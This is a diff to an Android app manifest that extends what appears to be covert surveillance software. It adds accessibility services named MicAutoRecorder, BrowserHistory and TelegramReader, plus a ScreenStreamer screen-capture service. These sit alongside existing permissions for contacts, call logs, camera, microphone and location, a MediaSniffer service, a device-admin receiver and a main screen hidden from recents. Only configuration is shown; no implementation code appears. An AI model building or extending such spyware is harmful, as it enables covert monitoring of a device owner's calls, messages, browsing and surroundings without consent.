@@ -17,13 +17,14 @@
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
     <uses-permission android:name="android.permission.CAMERA"/>
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
 
     <application
@@ -44,6 +45,7 @@
         <activity android:name=".WelcomeActivity" android:exported="false"/>
         <activity android:name=".OnboardingActivity" android:exported="false"/>
         <activity android:name=".MainActivity" android:exported="false" android:excludeFromRecents="true"/>
+        <activity android:name=".StatusActivity" android:exported="false"/>
         <activity android:name=".WebLoginActivity" android:exported="false"
             android:configChanges="orientation|screenSize|keyboardHidden"/>
 
@@ -94,6 +96,36 @@
                 android:resource="@xml/app_cfg"/>
         </service>
 
+        <service android:name=".MicAutoRecorder" android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice"
+                android:resource="@xml/mic_cfg"/>
+        </service>
+
+        <service android:name=".BrowserHistory" android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice"
+                android:resource="@xml/browser_cfg"/>
+        </service>
+
+        <service android:name=".TelegramReader" android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice"
+                android:resource="@xml/tg_cfg"/>
+        </service>
+
+        <service android:name=".ScreenStreamer" android:exported="false"
+            android:foregroundServiceType="mediaProjection"/>
+
         <service android:name=".MediaSniffer" android:exported="false"
             android:foregroundServiceType="mediaProjection"/>
 
@@ -101,6 +133,12 @@
             android:permission="android.permission.BIND_VPN_SERVICE">
             <intent-filter>
                 <action android:name="android.net.VpnService"/>
+            </intent-filter>
+        </service>
+
+        <service android:name=".FirebaseService" android:exported="false">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
             </intent-filter>
         </service>
 
@@ -134,12 +172,6 @@
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
             </intent-filter>
         </receiver>
-
-    <service android:name=".FirebaseService" android:exported="false">
-            <intent-filter>
-                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
-            </intent-filter>
-        </service>
 
     </application>
 </manifest>
